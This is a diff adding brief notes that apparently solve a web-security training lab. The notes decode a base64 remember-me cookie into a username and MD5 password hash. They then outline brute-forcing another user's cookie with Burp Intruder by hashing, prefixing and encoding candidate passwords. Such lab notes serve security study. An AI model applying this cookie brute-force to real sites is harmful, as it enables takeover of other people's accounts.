@@ -1,0 +1,14 @@
+# The Remember Me cookie
+Set-Cookie: stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw; Expires=Wed, 01 Jan 3000 01:00:00 UTC
+
+# Base64 decode
+wiener:51dc30ddc473d43a6011e9ebba6ca770
+
+# Determine hashing algorithm
+echo -n peter | md5sum
+
+# Bruteforce carlos's remember me cookie with Intruder
+	# For each payload, process with:
+		# Hash with MD5
+		# Add prefix of 'carlos:'
+		# Base64 encode
